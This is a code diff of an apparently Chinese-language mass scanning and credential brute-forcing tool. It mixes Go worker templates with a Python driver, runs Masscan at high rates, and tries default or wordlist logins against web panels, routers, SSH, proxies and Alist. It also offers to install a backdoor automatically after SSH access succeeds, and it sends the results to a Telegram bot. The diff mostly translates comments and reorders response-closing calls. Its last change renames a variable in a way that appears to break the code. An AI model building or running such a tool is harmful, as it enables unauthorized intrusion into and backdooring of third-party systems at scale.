@@ -88,6 +88,7 @@ func memoryMonitor() {
 	}
 }
 
+// 每个worker goroutine现在会复用同一个http.Client
 func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {
 	defer wg.Done()
 	tr := &http.Transport{
@@ -119,7 +120,7 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 			var resp *http.Response
 			var err error
 			
-			// Try HTTP
+			// 尝试 HTTP
 			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)
 			checkURLHttp := fmt.Sprintf("http://%s:%s/login", ip, port)
 			payloadHttp := fmt.Sprintf("username=%s&password=%s", username, password)
@@ -128,7 +129,7 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 			resp, err = httpClient.Do(reqHttp)
 			cancel()
 
-			// Try HTTPS if HTTP fails
+			// 如果 HTTP 失败则尝试 HTTPS
 			if err != nil {
 				if resp != nil { resp.Body.Close() }
 				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)
@@ -144,10 +145,10 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 				if resp != nil { resp.Body.Close() }
 				continue
 			}
+			defer resp.Body.Close()
 			
 			if resp.StatusCode == http.StatusOK {
 				body, readErr := io.ReadAll(resp.Body)
-				resp.Body.Close()
 				if readErr != nil { continue }
 				
 				var responseData map[string]interface{}
@@ -159,7 +160,6 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 				}
 			} else {
 				io.Copy(io.Discard, resp.Body)
-				resp.Body.Close()
 			}
 		}
 	}
@@ -171,6 +171,9 @@ func main() {
 		os.Exit(1)
 	}
 	inputFile, outputFile := os.Args[1], os.Args[2]
+	// 启动 pprof 服务器，用于性能分析
+	// 运行时可通过浏览器访问 http://localhost:6060/debug/pprof/
+	// 或使用命令行 go tool pprof http://localhost:6060/debug/pprof/heap
 	go func() { http.ListenAndServe("localhost:6060", nil) }()
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
@@ -350,10 +353,10 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 				if resp != nil { resp.Body.Close() }
 				continue
 			}
+			defer resp.Body.Close()
 			
 			if resp.StatusCode == http.StatusOK {
 				body, readErr := io.ReadAll(resp.Body)
-				resp.Body.Close()
 				if readErr != nil { continue }
 
 				var responseData map[string]interface{}
@@ -365,7 +368,6 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 				}
 			} else {
 				io.Copy(io.Discard, resp.Body)
-				resp.Body.Close()
 			}
 		}
 	}
@@ -729,17 +731,16 @@ func sendRequest(client *http.Client, fullURL string) (bool, error) {
         if resp != nil { resp.Body.Close() }
         return false, err 
     }
+	defer resp.Body.Close()
 	
 	if resp.StatusCode == http.StatusOK {
 		bodyBytes, readErr := io.ReadAll(resp.Body)
-		resp.Body.Close()
 		if readErr != nil { return false, readErr }
 		if strings.Contains(string(bodyBytes), `{"status":"success","data"`) {
 			return true, nil
 		}
 	} else {
 		io.Copy(io.Discard, resp.Body)
-		resp.Body.Close()
 	}
 	return false, nil
 }
@@ -928,9 +929,9 @@ func checkLogin(urlStr, username, password, origin, referer string, client *http
         if resp != nil { resp.Body.Close() }
         return false 
     }
-	
 	defer resp.Body.Close()
-	io.Copy(io.Discard, resp.Body) // Ensure body is read and closed
+	
+	io.Copy(io.Discard, resp.Body) // 确保body被读取和关闭
 
 	for _, c := range resp.Cookies() {
 		if c.Name == "sysauth_http" && c.Value != "" {
@@ -1076,7 +1077,6 @@ func memoryMonitor() {
 
 func worker(tasks <-chan string, outputFile *os.File, wg *sync.WaitGroup) {
 	defer wg.Done()
-	// Create a single client per worker, transport will be configured per-proxy
 	httpClient := &http.Client{ Timeout: {timeout} * time.Second }
 	for proxyAddr := range tasks {
 		processProxy(proxyAddr, outputFile, httpClient)
@@ -1186,9 +1186,9 @@ func checkConnection(proxyAddr string, auth *proxy.Auth, httpClient *http.Client
         if resp != nil { resp.Body.Close() }
         return false, err 
     }
+	defer resp.Body.Close()
 	
 	body, readErr := ioutil.ReadAll(resp.Body)
-	resp.Body.Close()
 	if readErr != nil { return false, fmt.Errorf("无法读取响应") }
 
 	proxyIP := string(body)
@@ -1371,25 +1371,32 @@ func processIP(ipPort string, file *os.File, httpClient *http.Client) {
 		base := fmt.Sprintf("%s://%s:%s", proto, ip, port)
 		testURL := base + "/api/me"
 		ctx, cancel := context.WithTimeout(context.Background(), ({timeout} + 1) * time.Second)
+		defer cancel()
 		req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
 		if err != nil {
-			cancel()
 			continue
 		}
 		req.Header.Set("User-Agent", "Mozilla/5.0")
 		req.Header.Set("Connection", "close")
 		resp, err := httpClient.Do(req)
-		cancel()
-		if err == nil && isValidResponse(resp) {
+		if err != nil {
+			if resp != nil {
+				resp.Body.Close()
+			}
+			continue
+		}
+
+		if isValidResponse(resp) {
 			file.WriteString(base + "\\n")
+			resp.Body.Close()
 			return
 		}
+		resp.Body.Close()
 	}
 }
 
 func isValidResponse(resp *http.Response) bool {
 	if resp == nil { return false }
-	defer resp.Body.Close()
 	body, err := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
 	if err != nil { return false }
 	var data map[string]interface{}
@@ -1506,18 +1513,18 @@ def adjust_column_width(ws):
         ws.column_dimensions[column_letter].width = adjusted_width
 
 def extract_ip_port(url):
-    # This regex is designed to find the core ip:port or domain:port from various URL formats
-    # It handles http://user:pass@ip:port/path -> ip:port
+    # 这个正则表达式旨在从各种URL格式中找到核心的ip:port或domain:port
+    # 它可以处理 http://user:pass@ip:port/path -> ip:port
     match = re.search(r'(\w+://)?([^@/]+@)?([^:/]+:\d+)', url)
     if match:
         return match.group(3)
     
-    # Fallback for simple ip:port or domain:port
+    # 备用方案，用于简单的ip:port或domain:port
     match = re.search(r'([^:/\s]+:\d+)', url)
     if match:
         return match.group(1)
         
-    # Fallback for just ip/domain if no port is present in the line
+    # 如果行中没有端口，则备用方案仅用于ip/域
     match = re.search(r'(\w+://)?([^@/]+@)?([^:/\s]+)', url)
     if match:
         return match.group(3)
@@ -1525,11 +1532,11 @@ def extract_ip_port(url):
     return url.split()[0]
 
 def get_ip_info_batch(ip_list, retries=3):
-    """Queries ip-api.com in batches of up to 100."""
+    """批量查询ip-api.com，每次最多100个。"""
     url = "http://ip-api.com/batch?fields=country,regionName,city,isp,query,status"
     results = {}
     
-    # Prepare payload for ip-api, extracting only the IP/domain part
+    # 准备ip-api的有效负载，仅提取IP/域部分
     payload = []
     for ip_port in ip_list:
         ip = ip_port.split(':')[0]
@@ -1541,7 +1548,7 @@ def get_ip_info_batch(ip_list, retries=3):
             response.raise_for_status()
             data = response.json()
             for item in data:
-                # Find the original ip_port from the input list that matches the query
+                # 从输入列表中找到与查询匹配的原始ip_port
                 original_ip_port = next((ip for ip in ip_list if ip.startswith(item.get('query', ''))), None)
                 if original_ip_port:
                     if item.get('status') == 'success':
@@ -1554,20 +1561,20 @@ def get_ip_info_batch(ip_list, retries=3):
                         ]
                     else:
                          results[original_ip_port] = [original_ip_port, '查询失败', '查询失败', '查询失败', '查询失败']
-            # Fill in any missing results from the original list (e.g., if API call fails for some)
+            # 填入原始列表中任何缺失的结果（例如，如果某些API调用失败）
             for ip_port in ip_list:
                 if ip_port not in results:
                     results[ip_port] = [ip_port, 'N/A', 'N/A', 'N/A', 'N/A']
-            # Return results in the same order as the input list
+            # 按与输入列表相同的顺序返回结果
             return [results[ip_port] for ip_port in ip_list]
         except requests.exceptions.RequestException as e:
             if attempt < retries - 1:
                 time.sleep(2)
             else:
-                # On final failure, return N/A for all in the batch
+                # 最终失败时，为批处理中的所有内容返回N/A
                 return [[ip_port, '超时/错误', '超时/错误', '超时/错误', '超时/错误'] for ip_port in ip_list]
     
-    # Fallback if loop completes without returning
+    # 如果循环完成但未返回，则备用
     return [[ip_port, 'N/A', 'N/A', 'N/A', 'N/A'] for ip_port in ip_list]
 
 def process_ip_port_file(input_file, output_excel):
@@ -1589,7 +1596,7 @@ def process_ip_port_file(input_file, output_excel):
     ws.append(headers)
     wb.save(output_excel)
 
-    # Prepare data for batching
+    # 准备批处理数据
     targets = []
     for line in lines:
         addr, user, passwd = line, '', ''
@@ -1614,8 +1621,8 @@ def process_ip_port_file(input_file, output_excel):
         if ip_port:
             targets.append({'line': line, 'ip_port': ip_port, 'user': user, 'passwd': passwd})
 
-    # Process in chunks
-    chunk_size = 100  # ip-api.com batch limit
+    # 分块处理
+    chunk_size = 100  # ip-api.com 批处理限制
     
     with tqdm(total=len(targets), desc="IP信息查询", unit="ip", ncols=100) as pbar:
         for i in range(0, len(targets), chunk_size):
@@ -1634,11 +1641,11 @@ def process_ip_port_file(input_file, output_excel):
             wb.save(output_excel)
             pbar.update(len(chunk))
             
-            # ip-api.com allows 15 batch requests per minute. 60/15 = 4 seconds per request.
+            # ip-api.com 允许每分钟15个批处理请求。60/15 = 每个请求4秒。
             if i + chunk_size < len(targets):
                 time.sleep(4.5)
 
-    # Adjust width once at the end
+    # 最后一次性调整宽度
     wb = load_workbook(output_excel)
     ws = wb.active
     adjust_column_width(ws)
@@ -1757,10 +1764,9 @@ def generate_ipcx_py():
 
 def split_file(input_file, lines_per_file):
     """
-    **MEMORY-EFFICIENT FILE SPLITTING**
-    This function reads the input file line by line (streaming) instead of
-    loading the whole file into memory. This allows it to handle files of
-    any size (like 40 million IPs) with minimal memory usage.
+    **内存高效的文件分割**
+    此函数逐行读取输入文件（流式传输），而不是将整个文件加载到内存中。
+    这使得它能够以最小的内存使用量处理任何大小的文件（例如4000万个IP）。
     """
     print(f"--- 正在以流式模式分割大文件 '{input_file}'... (这可能需要一些时间) ---")
     try:
@@ -2147,7 +2153,7 @@ def check_environment(template_mode):
 
         urls = ["https://studygolang.com/dl/golang/go1.22.1.linux-amd64.tar.gz", "https://go.dev/dl/go1.22.1.linux-amd64.tar.gz"]
         if not in_china:
-            urls.reverse() # Prioritize go.dev if not in China
+            urls.reverse() # 如果不在中国，优先使用go.dev
 
         GO_TAR_PATH = "/tmp/go.tar.gz"
         download_success = False
@@ -2188,7 +2194,7 @@ def check_environment(template_mode):
     required_pkgs = []
     if template_mode == 6: # SSH
         required_pkgs.append("golang.org/x/crypto/ssh")
-    if template_mode in [9, 10, 11]: # Proxy modes
+    if template_mode in [9, 10, 11]: # 代理模式
         required_pkgs.append("golang.org/x/net/proxy")
 
     if required_pkgs:
@@ -2214,10 +2220,10 @@ def load_credentials(template_mode, auth_mode=0):
     if template_mode == 12: # Alist 模式不需要凭据
         return [], [], []
 
-    if auth_mode == 1: # No credentials
+    if auth_mode == 1: # 无凭据
         return [], [], []
     
-    if auth_mode == 2: # User/Pass files
+    if auth_mode == 2: # 用户/密码文件
         if not os.path.exists("username.txt") or not os.path.exists("password.txt"):
             print("❌ 错误: 缺少 username.txt 或 password.txt 文件。")
             sys.exit(1)
@@ -2230,7 +2236,7 @@ def load_credentials(template_mode, auth_mode=0):
             sys.exit(1)
         return usernames, passwords, credentials
 
-    if auth_mode == 3: # Credentials file
+    if auth_mode == 3: # 凭据文件
         if not os.path.exists("credentials.txt"):
             print("❌ 错误: 缺少 credentials.txt 文件。")
             sys.exit(1)
@@ -2241,10 +2247,10 @@ def load_credentials(template_mode, auth_mode=0):
             sys.exit(1)
         return usernames, passwords, credentials
 
-    # Default logic for non-proxy modes
+    # 非代理模式的默认逻辑
     use_custom = input("是否使用 username.txt / password.txt 字典库？(y/N，使用内置默认值): ").strip().lower()
     if use_custom == 'y':
-        return load_credentials(template_mode, auth_mode=2) # Reuse logic
+        return load_credentials(template_mode, auth_mode=2) # 复用逻辑
     else:
         if template_mode == 8: usernames, passwords = ["root"], ["password"]
         else: usernames, passwords = ["admin"], ["admin"]
@@ -2276,7 +2282,7 @@ def get_nezha_server(config_file="config.yml"):
     return "N/A"
 
 def parse_result_line(line):
-    """Parses a result line and returns ip, port, user, password."""
+    """解析结果行并返回ip, port, user, password。"""
     proxy_match = re.match(r'(\w+)://(?:([^:]+):([^@]+)@)?([\d\.]+):(\d+)', line)
     if proxy_match:
         user = proxy_match.group(2) or ''
@@ -2307,7 +2313,7 @@ def analyze_and_expand_scan(result_file, template_mode, params, template_map, ma
     ips_to_analyze = master_results
     all_newly_verified_ips = set()
 
-    for i in range(2): # Perform two rounds of expansion
+    for i in range(2): # 执行两轮扩展
         print(f"\n--- [扩展扫描 第 {i+1}/2 轮] ---")
         
         groups = {}
@@ -2459,7 +2465,7 @@ if __name__ == "__main__":
                 params = {}
                 AUTH_MODE = 0
 
-                if TEMPLATE_MODE == 6: # SSH mode
+                if TEMPLATE_MODE == 6: # SSH 模式
                     choice = input("是否在SSH爆破成功后自动安装后门？(y/N)：").strip().lower()
                     if choice == 'y':
                         params['install_backdoor'] = True
@@ -2472,7 +2478,7 @@ if __name__ == "__main__":
                         params['install_backdoor'] = False
                         params['custom_cmds'] = []
                 
-                if TEMPLATE_MODE in [9, 10, 11]: # Proxy modes
+                if TEMPLATE_MODE in [9, 10, 11]: # 代理模式
                     print("\n请选择代理凭据模式：")
                     print("1. 无凭据 (扫描开放代理)")
                     print("2. 独立字典 (使用 username.txt 和 password.txt)")
@@ -2506,7 +2512,7 @@ if __name__ == "__main__":
                 if recommended_threads < 50: recommended_threads = 50
                 params['semaphore_size'] = input_with_default(f"爆破线程数 (根据内存推荐 {recommended_threads})", recommended_threads)
 
-                params['timeout'] = input_with_default("超时时间(秒)", 4)
+                params['timeout'] = input_with_default("超时时间(秒)", 3)
                 masscan_rate = input_with_default("请输入Masscan扫描速率(pps)", 50000)
                 
                 params['usernames'], params['passwords'], params['credentials'] = load_credentials(TEMPLATE_MODE, AUTH_MODE)
@@ -2631,4 +2637,4 @@ if __name__ == "__main__":
 
                     for f in files_to_send:
                         print(f"\\n📤 正在将 {f} 上传至 Telegram ...")
-                        send_to_telegram(f, BOT_TOKEN, CHAT_ID, vps_ip, vps_country, nezha_server)
+                        send_to_telegram(f, BOT_TOKEN, CH_ID, vps_ip, vps_country, nezha_server)
